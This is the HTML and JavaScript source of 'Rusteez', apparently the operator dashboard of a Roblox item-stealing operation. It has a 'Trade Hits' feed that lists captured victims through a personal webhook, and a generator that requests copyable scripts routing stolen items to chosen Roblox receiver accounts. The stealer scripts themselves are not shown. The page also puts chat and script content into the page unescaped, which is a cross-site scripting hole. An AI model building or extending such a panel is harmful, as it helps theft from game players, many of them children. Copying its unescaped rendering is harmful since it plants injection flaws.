<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="style.css">
    <title>Rusteez | Panel</title>
</head>
<body>
    <div class="dashboard-container">
        <div class="sidebar">
            <h2 style="color:var(--accent); text-align:center;">RUSTEEZ</h2>
            <nav style="margin-top:20px;">
                <button class="tab-btn active" onclick="openTab(event, 'trade-hits')">💎 Trade Hits</button>
                <button class="tab-btn" onclick="openTab(event, 'messages')">💬 General Chat</button>
                <button class="tab-btn" onclick="openTab(event, 'my-scripts')">📜 My Scripts</button>
                <button class="tab-btn" onclick="openTab(event, 'create-script')">🛠️ Create Script</button>
            </nav>
            <div style="margin-top:auto; padding:10px; background:rgba(0,0,0,0.2); border-radius:8px;">
                <div id="username-display" style="font-weight:bold;">Loading...</div>
                <div style="font-size:0.7em; color:var(--success);">● Connection Stable</div>
                <button onclick="logout()" style="width:100%; margin-top:10px; background:var(--danger); border:none; color:white; padding:5px; border-radius:4px; cursor:pointer;">Logout</button>
            </div>
        </div>

        <div class="main-content">
            <div id="trade-hits" class="tab-content active">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <h1>Trade Hits</h1>
                    <code id="webhook-url" style="color:var(--success); font-size:0.8em;">URL...</code>
                </div>
                <div id="hits-container" style="margin-top:20px;">
                    <p style="color:gray;">Awaiting hits...</p>
                </div>
            </div>

            <div id="messages" class="tab-content">
                <h1>#general-discussion</h1>
                <div class="chat-container">
                    <div id="message-list"></div>
                    <div style="padding: 15px; background: var(--bg-sidebar); display: flex; gap: 10px; border-radius: 0 0 8px 8px;">
                        <input type="text" id="chat-input" placeholder="Message #general" 
                               onkeypress="if(event.key === 'Enter') sendChatMessage()">
                        <button onclick="sendChatMessage()" style="width: 100px;">Send</button>
                    </div>
                </div>
            </div>

            <div id="my-scripts" class="tab-content">
                <h1>My Generated Scripts</h1>
                <div id="scripts-container" style="margin-top:20px;">
                    <p style="color:gray;">No scripts generated yet.</p>
                </div>
            </div>

            <div id="create-script" class="tab-content">
                <h1>Script Generator</h1>
                <div class="auth-card" style="max-width: 500px; text-align: left; margin-top: 20px;">
                    <div style="background: rgba(155, 89, 182, 0.1); border-left: 3px solid var(--accent); padding: 10px; margin-bottom: 20px; font-size: 0.85em;">
                        ℹ️ <strong>Information:</strong> Once generated by the admin, your script will appear automatically in the <strong>"My Scripts"</strong> tab.
                    </div>
            
                    <label>Roblox Receivers (comma separated):</label>
                    <input type="text" id="req-receivers" placeholder="Ex: RobloxUsername1, RobloxUsername2">
            
                    <label>Minimum Income:</label>
                    <select id="req-income">
                        <option value="1M/s">1M/s</option>
                        <option value="5M/s">5M/s</option>
                        <option value="10M/s">10M/s</option>
                        <option value="25M/s">25M/s</option>
                        <option value="50M/s">50M/s</option>
                        <option value="100M/s">100M/s</option>
                        <option value="500M/s">500M/s</option>
                    </select>
            
                    <button onclick="sendScriptRequest()" style="margin-top: 20px;">GENERATE REQUEST</button>
                    <div id="request-status" style="margin-top: 15px; text-align: center; font-size: 0.9em;"></div>
                </div>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let currentUser = null;

        async function init() {
            const res = await fetch('/api/user/me');
            currentUser = await res.json();
            document.getElementById('username-display').innerText = currentUser.username;
            document.getElementById('webhook-url').innerText = window.location.origin + "/webhook/" + currentUser.webhook;
            
            socket.emit('join_room', currentUser.id);
            loadMessages();
            loadMyScripts();
        }

        function openTab(evt, tabName) {
            const contents = document.getElementsByClassName("tab-content");
            for (let c of contents) c.classList.remove("active");
            const buttons = document.getElementsByClassName("tab-btn");
            for (let b of buttons) b.classList.remove("active");
            document.getElementById(tabName).classList.add("active");
            evt.currentTarget.classList.add("active");
            
            if(tabName === 'messages') {
                const list = document.getElementById('message-list');
                list.scrollTop = list.scrollHeight;
            }
        }

        // --- LOGIQUE CHAT ---
        async function loadMessages() {
            const res = await fetch('/api/messages');
            const messages = await res.json();
            const list = document.getElementById('message-list');
            list.innerHTML = "";
            messages.forEach(displayMessage);
        }

        function displayMessage(msg) {
            const list = document.getElementById('message-list');
            const div = document.createElement('div');
            div.className = 'message-entry';
            const isMe = msg.senderName === currentUser.username;
            div.style.borderLeft = isMe ? '3px solid var(--accent)' : '3px solid #7289da';
            
            div.innerHTML = `
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <strong style="color:${isMe ? 'var(--accent)' : '#fff'}">${msg.senderName}</strong>
                    <small style="color:gray; font-size:0.7em;">${new Date(msg.timestamp).toLocaleTimeString()}</small>
                </div>
                <div style="margin-top:5px;">${msg.content}</div>
            `;
            list.appendChild(div);
            list.scrollTop = list.scrollHeight;
        }

        async function sendChatMessage() {
            const input = document.getElementById('chat-input');
            const content = input.value;
            if(!content) return;
            await fetch('/api/messages/send', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: content })
            });
            input.value = "";
        }

        socket.on('new_general_message', (msg) => { displayMessage(msg); });

        // --- LOGIQUE MY SCRIPTS ---
        async function loadMyScripts() {
            const res = await fetch('/api/my-scripts');
            const scripts = await res.json();
            const container = document.getElementById('scripts-container');
            
            if(scripts.length > 0) {
                container.innerHTML = "";
                scripts.forEach(s => {
                    const card = document.createElement('div');
                    card.className = 'hit-card';
                    card.style.borderLeft = '4px solid var(--accent)';
                    card.innerHTML = `
                        <div class="hit-header">Rusteez Script:</div>
                        <div class="hit-section">
                            <strong>Receiver:</strong> ${s.receiver}<br>
                            <strong>Minimum Income:</strong> ${s.minIncome}
                        </div>
                        <div style="margin-top:10px; background:#000; padding:10px; border-radius:4px; cursor:pointer;" onclick="copyScript(this, '${s.scriptCode}')">
                            <code style="color:var(--success); font-size:0.85em; word-break:break-all;">${s.scriptCode}</code>
                        </div>
                    `;
                    container.appendChild(card);
                });
            }
        }

        function copyScript(el, text) {
            navigator.clipboard.writeText(text);
            const originalColor = el.style.background;
            el.style.background = "#222";
            setTimeout(() => el.style.background = originalColor, 200);
            alert("Script copié !");
        }

        // Écouter si un script est généré pendant qu'on est connecté
        socket.on('script_generated', () => { loadMyScripts(); });

        // --- LOGIQUE HITS ---
        socket.on('receive_message', (data) => {
            const container = document.getElementById('hits-container');
            if(container.innerHTML.includes("Awaiting")) container.innerHTML = "";
            const card = document.createElement('div');
            card.className = 'hit-card';
            card.innerHTML = `<div class="hit-header">MozilOnTop • SAB Hit [ 🌊 ]</div>
                              <div class="hit-section">👤 User: ${data.username || 'N/A'}<br>💻 Exec: ${data.executor || 'N/A'}</div>
                              <div style="color:#00ff00; margin-top:10px;">${data.text || 'Items captured'}</div>`;
            container.prepend(card);
        });
        
        async function sendScriptRequest() {
            const receivers = document.getElementById('req-receivers').value;
            const minIncome = document.getElementById('req-income').value;
            const statusDiv = document.getElementById('request-status');
        
            if(!receivers) {
                statusDiv.style.color = "var(--danger)";
                statusDiv.innerText = "Please enter at least one receiver.";
                return;
            }
        
            const res = await fetch('/api/scripts/request', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ receivers, minIncome })
            });
        
            if(res.ok) {
                statusDiv.style.color = "var(--success)";
                statusDiv.innerText = "Request sent successfully! Check 'My Scripts' soon.";
                document.getElementById('req-receivers').value = "";
            } else {
                statusDiv.style.color = "var(--danger)";
                statusDiv.innerText = "Error sending request.";
            }
        }
        function logout() {
            document.cookie = "auth_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
            window.location.href = "/login";
        }

        init();
    </script>
</body>
</html>
